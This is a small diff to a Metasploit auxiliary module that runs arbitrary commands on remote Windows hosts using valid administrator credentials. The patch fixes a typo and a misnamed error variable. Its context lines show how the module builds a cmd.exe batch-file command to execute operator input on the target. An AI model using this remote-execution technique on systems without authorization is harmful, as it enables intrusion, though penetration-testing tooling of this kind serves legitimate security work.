@@ -22,7 +22,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Description'    => %q{
 					This module uses a valid administrator username and password to execute an
 				arbitrary command on one or more hosts, using a similar technique than the "psexec"
-				utility provided by SysInternals. Daisy chaining commands wiht '&' does not work
+				utility provided by SysInternals. Daisy chaining commands with '&' does not work
 				and users shouldn't try it. This module is useful because it doesn't need to upload
 				any binaries to the target machine.
 			},
@@ -83,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 			execute = "%COMSPEC% /C echo #{datastore['COMMAND']} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
 			print_status("#{peer} - Executing the command...")
 			return psexec(execute)
-		rescue StandardError => exec_command_cerror
+		rescue StandardError => exec_command_error
 			print_error("#{peer} - Unable to execute specified command: #{exec_command_error}")
 			return false
 		end
